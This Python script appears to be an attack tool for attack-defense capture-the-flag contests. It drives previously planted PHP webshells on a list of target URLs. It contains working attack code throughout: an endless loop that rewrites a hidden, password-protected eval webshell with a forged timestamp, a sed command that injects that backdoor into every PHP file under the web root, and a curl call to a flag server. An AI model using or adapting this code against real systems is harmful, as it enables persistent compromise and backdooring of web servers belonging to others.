#!/usr/bin/python
#coding=utf-8
import sys
import plugin.upload1,plugin.upload,plugin.command,plugin.insert,plugin.getflag

def loadfile(filepath):
	try : 
		file = open(filepath,"rb")
		return str(file.read())
	except : 
		print "File %s Not Found!" %filepath
		sys.exit()

def use():
	print "[+] Attack Method > upload            #upload shell return shell_addr"
	print "[+] Attack Method > upload1           #upload bsm_shell and active bsm_shell"
	print "[+] Attack Method > command           #use 'while' command to write shell"
	print "[+] Attack Method > insert            #insert shell_code to all files"
	print "[+] Attack Method > getflag           #use curl command to getflag"
	print "[+] Attack Method > exit              #exit\n\n"
	#print "[+] option : exec,passthru,system or shell_exec"
if __name__ == '__main__':
	method_list=["exec","passthru","system","shell_exec"]
	use()
	while True:
		ms = raw_input("Attack Method > ")
		shellstr=loadfile("./webshell.txt")
		list = shellstr.split("\r\n")
		#print str(list)
		i = 0
		url={}
		passwd={}
		method={}
		for data in list:
			if data:
				ls = data.split(",")
				method_tmp = str(ls[1])
				method_tmp = method_tmp.lower()
				if method_tmp=='post' or method_tmp=='get':
					url[i]=str(ls[0])
					method[i]=method_tmp
					passwd[i]=str(ls[2])
					i+=1
				else :
					print "[-] %s request method error!" %(str(ls[0]))
			else : pass
		ms = ms.lower()
		i=0
		for j in range(len(url)):
			#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])
			if(ms=="upload1"):
				plugin.upload1.upload(url=url[j],method=method[j],passwd=passwd[j])
			elif(ms=="upload"):
				plugin.upload.upload(url=url[j],method=method[j],passwd=passwd[j])
			elif(ms=="command"):
				if(i==0):
					print "[-] Method Only have one in exec,passthru,system or shell_exec\n\n"
					met = raw_input("Command Method > ")
					i+=1
				while met not in method_list:
					print "[-] Method Only have one in exec,passthru,system or shell_exec\n\n"
					met = raw_input("Command Method > ")
				cmd = met+"('while true;do echo \\'<?php if(md5($_POST[pass])==\"3a50065e1709acc47ba0c9238294364f\"){@eval($_POST[a]);} ?>\\' >.index1.php;touch -m -d \"2017-11-17 10:21:26\" .index1.php;sleep 5;done;');"
				plugin.command.cmd(url=url[j],method=method[j],passwd=passwd[j],cmd=cmd)
			elif(ms=="insert"):
				if(i==0):
					print "[-] Method Only have one in exec,passthru,system or shell_exec\n\n"
					met = raw_input("Command Method > ")
					i+=1
				while met not in method_list:
					print "[-] Method Only have one in exec,passthru,system or shell_exec\n\n"
					met = raw_input("Command Method > ")
				#web目录记得修改。
				cmd= met+"('find /var/www/html -type f -path \"*.php\" | xargs sed -i \"s/<?php/<?php \\n if(md5(\$_POST[\\\"pass\\\"])==\\\"3a50065e1709acc47ba0c9238294364f\\\"){@eval(\$_POST[a]);};\\n/g\"');"
				plugin.insert.cmd(url=url[j],method=method[j],passwd=passwd[j],cmd=cmd)
			elif(ms=="getflag"):
				flag_path="Flag.txt"
				if(i==0):
					print "[-] Method Only have one in exec,passthru,system or shell_exec\n\n"
					met = raw_input("Command Method > ")
					i+=1
				while met not in method_list:
					print "[-] Method Only have one in exec,passthru,system or shell_exec\n\n"
					met = raw_input("Command Method > ")
				#flag机ip记得改
				flag_ip="192.168.45.1"
				cmd = "echo "+met+"('curl "+flag_ip+"');"
				plugin.getflag.getflag(url=url[j],method=method[j],passwd=passwd[j],cmd=cmd,flag_path=flag_path)
			elif(ms=="exit"):
				sys.exit()
			else :
				use()
		if(ms=="getflag"):
			print "[+] Getflag finished!"
	